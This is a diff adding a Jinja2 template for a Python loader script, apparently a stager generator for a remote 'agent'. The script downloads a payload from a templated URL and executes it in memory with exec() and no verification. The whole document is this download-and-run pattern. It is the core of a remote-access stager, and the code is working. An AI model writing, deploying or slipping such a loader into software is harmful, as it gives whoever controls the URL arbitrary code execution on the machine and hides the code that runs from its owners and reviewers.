@@ -1,0 +1,22 @@
+# loader_template.py.j2
+
+import requests
+import sys
+
+def load_agent_code():
+    # Download the full agent payload from the provided URL.
+    url = "{{ agent_code_url }}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        return response.text
+    else:
+        print("Failed to load agent code from", url)
+        sys.exit(1)
+
+def execute_agent_code(code):
+    # Execute the downloaded code in memory.
+    exec(code, globals())
+
+if __name__ == "__main__":
+    agent_code = load_agent_code()
+    execute_agent_code(agent_code)
